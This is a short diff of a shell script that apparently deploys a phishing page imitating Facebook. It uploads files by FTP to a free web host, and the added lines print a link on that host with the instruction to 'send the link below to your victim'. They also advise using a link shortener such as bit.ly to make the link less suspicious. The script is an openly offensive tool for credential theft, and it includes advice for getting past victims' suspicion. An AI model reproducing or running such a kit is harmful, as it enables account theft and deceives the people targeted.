@@ -22,7 +22,10 @@ put $FILE2
 put $FILE3
 quit
 END_SCRIPT
-exit 0
 echo
 echo "Send the link below to your victim:"
-echo "http://clipush.42web.io/fb/$EMAIL/link/" 
+echo "Link: http://clipush.42web.io/fb/$EMAIL/link/" 
+echo
+echo "Use link shortener like bit.ly to"
+echo "make the link less suspicious"
+exit 0
